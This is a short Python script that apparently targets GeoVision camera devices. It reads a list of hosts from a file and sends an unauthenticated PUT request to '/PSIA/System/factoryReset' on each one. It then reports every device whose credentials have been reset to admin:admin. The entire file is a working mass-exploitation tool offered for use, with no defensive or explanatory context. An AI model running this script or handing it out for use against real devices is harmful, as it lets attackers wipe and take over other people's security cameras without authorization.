import sys , os , re , requests , requests.exceptions
class geovisionExploit:
    def geovisionExploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/Host/up_host.txt', 'r').read().splitlines()
        pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        pattern_2 = r'(\:).*'
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                match1 = re.search(pattern_1, res)
                match2 = re.search(pattern_2, res)
                target_host = match1.group()
                port_raw = match2.group()
                port = port_raw[1:]
                url = "http://" + target_host + ":" + port + "/PSIA/System/factoryReset"
                c = requests.put(url)
                if c.ok == True:
                    print("[-] Found http://"+ target_host + ":" + port + " with credential reset to admin:admin")
            except requests.exceptions.ConnectionError:
                pass
            except AttributeError:
                pass
            a += 1

